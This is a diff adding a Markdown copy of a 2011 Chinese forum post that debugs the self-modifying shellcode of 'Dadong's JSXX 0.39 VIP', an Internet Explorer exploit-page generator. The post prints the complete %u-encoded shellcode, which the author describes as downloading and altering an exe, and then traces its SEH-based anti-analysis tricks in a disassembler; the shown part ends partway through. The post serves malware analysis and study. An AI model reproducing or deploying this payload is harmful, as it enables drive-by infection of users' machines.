@@ -1,0 +1,110 @@
+
+# Dadong's JSXX 0.39 VIP 所用 shellcode 调试
+
+> 原文：[`www.pediy.com/kssd/pediy12/132109.html`](https://www.pediy.com/kssd/pediy12/132109.html)
+
+标题: 【原创】Dadong's JSXX 0.39 VIP 所用 shellcode 调试  
+作者: promised(ID 注册时打错了,不知道能不能改名)  
+时间: 2011-04-09, 23:03:26  
+链接: http://bbs.pediy.com/showthread.php?t=132109
+
+`Dadong's JSXX 0.39 VIP` 是 IE 极风漏洞网马的一种生成器。
+
+其所用 shellcode 多次自修改，并修改 shellcode 所下载的 exe 文件，使 shellcode 的静态分析变得困难。
+
+由于这个 shellcode 用 `libemu` 模拟失败，于是只好自己分析了。本人非常菜，如有错误还请各位指正。
+
+shellcode 如下，将其嵌入 exe 调试
+
+`%u9090%u9090%uC233%uD8E8%u0003%u9A00%u3037%u8DA0%u1925%u4B39%uB944%u58DA%uE5E2%u8E7B%uA401%u0AC7%u2664%u27D9%u8DAA%u68BF%uF979%uC1D1%u1AE3%uCF08%u54ED%u456B%u54B7%u3E20%uBF50%u2F8A%u1CA8%uECAD%u81B9%u887F%u3982%u50DA%uB081%uE527%u7B56%u0AB4%uF357%uB8BE%u370F%uF254%u6BAE%uB37D%u8D6D%u0C40%u8773%uC4FA%u26F8%uF87D%uAE4E%u56D0%u661F%u606C%u801D%u6738%u26A6%u31C9%uAFE5%uF62C%uED8B%uDA50%u6541%u1C67%uA81D%u7633%uE19F%u3FA5%u07B3%u88F9%u0961%uBCA2%uA8CA%u7476%u23B9%uD289%uEF0E%uEE89%u0A0F%uF9F9%u5151%uC181%u90A4%u10CC%u7F8A%uBB74%uB458%uBC46%uF1B1%u9E94%uFB06%uD21F%uF8C0%u0430%uD0D5%uB8DD%uBA41%uF250%uFFAB%uCDA3%u264A%u5899%u8281%u3E9E%uF7E7%uFA8D%u16CF%u0228%uF532%uF0AF%u7EC3%uA699%u330C%u62CB%u9314%uFC1E%u23D7%uD33F%u9C90%u758A%uEA67%u86D0%u0EB8%u23D8%u17C0%uDB2B%u9BED%u897B%u4311%u284A%uE23F%u1D96%u01E4%u40E7%uCA8D%u1D34%u2EE9%uB241%u048B%u4B56%u6D09%u1CE0%u475C%uCEA6%u0E89%uAC48%u0AE0%uFF56%u60C7%u500A%uC031%u01D9%uA36A%uC1D2%u2E7F%uF3B8%uDDBC%uA477%uA397%u566C%u4FA5%u4443%u766E%uBFC9%u10F0%u78BB%u315C%u0FD1%u94BD%u1AF9%u84FF%u6F49%u5A99%uC4EC%u18BA%u6A09%u93FB%uBABB%uF41B%u29CD%u57B1%u205A%uF1EE%uA1E3%u9197%u8EF4%u70D6%u43AE%uD000%u329C%uE373%u7F99%u9900%u6230%uEDE1%uFD81%uC18E%u3C9F%uD0E5%u0D56%u700D%u5605%u38F5%u1473%uA945%uCA6D%u57EC%u29AB%u5D79%u816D%uD954%u0CBC%uCB8F%uF0A0%u257F%u2E9F%u07E6%u0A16%u6FAD%u0FB7%u45F8%uC0C9%u524D%u35D3%uD8C4%u712B%uD364%u373B%u1073%u489B%u729B%u9D4A%uADA7%u7935%u54CF%uC53E%uD412%u6D94%u9F6C%u443F%u7E15%uB227%uAFA1%u8F01%uCB83%u2429%u4FFE%u331A%u12B2%u2EC4%u5A67%uA5B9%u5130%u90A2%u9435%uC452%u1743%uFD5D%uBC77%uC888%u8DC7%uAEB7%uF94E%u9D04%uF007%u8D6C%u007E%u58FC%uE225%u047E%u0D6B%u18F1%u7DDD%uD298%u5C54%uCFF8%uDBEF%u9BB3%u5BDB%u2900%uA940%u01DF%uA01A%uB38C%u2BA3%u8CB6%u8BE9%u1944%u7BCE%uD695%u079F%u87EB%u372C%uB836%u86ED%u6DEA%uE69A%uAD51%uC5BC%uDF66%u26AE%uF8C2%u8C87%u0604%u0038%uAB9A%u05AA%u2725%uF832%u2B3A%u3B7C%uC4F1%u6620%u89B3%uAF49%u1E21%u2781%u73A8%u41C8%u3DD7%u9F9E%uBAC9%u440C%uF7BF%uDC9F%uF434%u4DA8%uFAD5%uF569%uFCD3%u4CC7%u0AFE%u17CC%u5CEA%uB621%u9A39%u4A23%u41A8%u3910%u08DF%u944B%u58FE%u739A%u65F7%u3064%u763E%u9FAE%uD311%u5822%uE112%uB801%uBF3B%u1AF0%u8D7F%uA539%u4D3B%uD0EA%uEDCA%u6894%u6F72%uF844%u1142%uFD94%u9088%u5212%uC41F%u1AC0%u1ED0%u82BD%u2278%u7806%u294F%uC172%uFF9C%uA582%uBEBA%u92D7%uAE52%uA058%uA31B%u54D9%u12D0%u0AA7%uF6B2%u4253%u01AD%u4B04%u824E%u773E%u8660%u5C53%u0B91%u485A%u1597%uAA0B%u824F%uD5E6%u39D5%u037F%u0F2E%u8165%u1EA6%uDB2B%u188B%u2FCB%u3BD3%u6F00%uF0FC%u6979%uE0B9%u9463%u15A0%u7AE6%uAF06%uCD44%u049F%uB448%u9164%uB82D%u1E61%u1A55%u84D3%uB240%uDFEC%uD986%u0490%u0F70%uD322%u5241%u38FA%uC271%uDE9E%u1226%uB309%u4767%uAFEB%u97E5%uC525%u8093%uF1CB%uC556%u3CB7%u113F%uD0F9%uC88A%uED85%uC6E2%u2452%uD349%u04B6%uF971%uA972%u3A89%u387D%uDA77%u0302%uF95C%uAB9D%uBB16%u024A%u799A%u637C%u9D11%u78F1%u312B%u80C4%u87D5%u692C%u445D%u2304%uDF8D%u51A6%u6935%uF124%u9241%uF600%u3E7C%u25DF%u5F05%u10A6%uF384%u1DB4%u1EF2%u8205%uB2C0%u987A%uB761%u4D45%u160F%u0695%uF134%u3BE4%u50DD%uEC34%u648A%u3350%uFCC4%uE860%u0006%u0000%u648B%u0824%u0CEB%uDB33%uFF64%u6433%u2389%u03FF%uE8EB%uC733%u2BD6%u64C9%u018F%uE859%u0000%u0000%uC203%u2C8B%u5824%uED81%u3860%u0015%uC70B%u68D6%uD352%u30B5%u815F%u0DF7%uA0E7%uC130%u39C8%uFD03%uDB68%uA0EA%u5B30%uF381%uEA2D%u30A0%uC21B%u0ABA%uA0A7%u3330%u40C0%u1731%u4893%uC193%uD7F8%u09E8%u0000%u8B00%uE9C0%u0009%u0000%uC50B%u2BF8%uC3C5%uD8C1%uF9BF%u4747%u4747%uE898%u0008%u0000%u07E9%u0000%u9000%uC28B%u73F9%uC36F%u33F9%u81C7%uCBC2%uA0D6%u0330%u51C2%uCB8B%u03E3%uEB59%u59B9%uC233%uC361`
+
+## 模块入口点
+
+```
+00405030    90                   NOP
+00405031    90                   NOP
+00405032    90                   NOP
+00405033    90                   NOP
+00405034    33C2                  XOR EAX,EDX
+00405036    E8 D8030000           CALL 00405413
+0040503B    9A 3730A08D 2519      CALL FAR 1925:8DA03037            ;这里开始代码就不正常了，先忽略
+```
+
+调用 `00405413`：
+
+```
+00405413    33C4                  XOR EAX,ESP
+00405415    FC                   CLD
+00405416    60                   PUSHAD
+00405417    E8 06000000           CALL 00405422                      ;返回地址 0040541C 入栈
+```
+
+调用 `00405422`：
+
+```
+00405422    33DB                  XOR EBX,EBX                        ;EBX 清零
+00405424    64:FF33               PUSH DWORD PTR FS:[EBX]            ;指向下一个 SEH 记录的指针
+00405427    64:8923               MOV DWORD PTR FS:[EBX],ESP
+0040542A    FF03                  INC DWORD PTR DS:[EBX]             ;EBX=0，产生异常，异常处理函数即为 0040541C
+```
+
+异常处理程序如何被调用：
+
+具体参考
+
+http://bbs.pediy.com/showthread.php?t=65783
+
+http://www.microsoft.com/msj/0197/exception/exception.aspx
+
+```c
+int ExecuteHandler( PEXCEPTION_RECORD pExcptRec,
+                    PEXCEPTION_REGISTRATION pExcptReg,
+                    CONTEXT *pContext,
+                    PVOID pDispatcherContext,
+                    FARPROC handler )
+{
+77F8EB4A                  55                   PUSH EBP
+77F8EB4B                  8BEC                 MOV EBP,ESP
+77F8EB4D                  FF75 0C              PUSH DWORD PTR SS:[EBP+C]          ;pExcptReg
+77F8EB50                  52                   PUSH EDX
+77F8EB51                  64:FF35 00000000     PUSH DWORD PTR FS:[0]
+77F8EB58                  64:8925 00000000     MOV DWORD PTR FS:[0],ESP
+77F8EB5F                  FF75 14              PUSH DWORD PTR SS:[EBP+14]         ;pDispatcherContext
+77F8EB62                  FF75 10              PUSH DWORD PTR SS:[EBP+10]         ;pContext
+77F8EB65                  FF75 0C              PUSH DWORD PTR SS:[EBP+C]          ;pExcptReg
+77F8EB68                  FF75 08              PUSH DWORD PTR SS:[EBP+8]          ;pExcptRec
+77F8EB6B                  8B4D 18              MOV ECX,DWORD PTR SS:[EBP+18]      ;ECX=异常处理函数 handler
+77F8EB6E                  FFD1                 CALL ECX                           ;调用异常处理函数
+77F8EB70                  64:8B25 00000000     MOV ESP,DWORD PTR FS:[0]
+77F8EB77                  64:8F05 00000000     POP DWORD PTR FS:[0]
+77F8EB7E                  8BE5                 MOV ESP,EBP
+77F8EB80                  5D                   POP EBP
+77F8EB81                  C2 1400              RETN 14
+}
+```
+
+异常处理函数 `0040541C`：
+
+```
+0040541C    8B6424 08            MOV ESP,DWORD PTR SS:[ESP+8]       ;pExcptReg，这个 pExcptReg 是 0040542A 处异常的 EXCEPTION_REGISTRATION 链表的头，即 pExcptReg=0040542A 处的 ESP，这里 ESP 退到了 0040542A 处的 ESP
+00405420    EB 0C                JMP SHORT 0040542E
+```
+
+跳转到 `0040542E`：
+
+```
+0040542E    33C7                  XOR EAX,EDI
+00405430    D6                   SALC
+00405431    2BC9                  SUB ECX,ECX
+00405433    64:8F01               POP DWORD PTR FS:[ECX]
+00405436    59                   POP ECX
+00405437    E8 00000000           CALL 0040543C                      ;返回地址 0040543C 入栈
+```
+
+调用 `0040543C`：
+
+```
+0040543C    03C2                  ADD EAX,EDX
+0040543E    8B2C24                MOV EBP,DWORD PTR SS:[ESP]         ;EBP=0040543C
+00405441    58                   POP EAX
+```
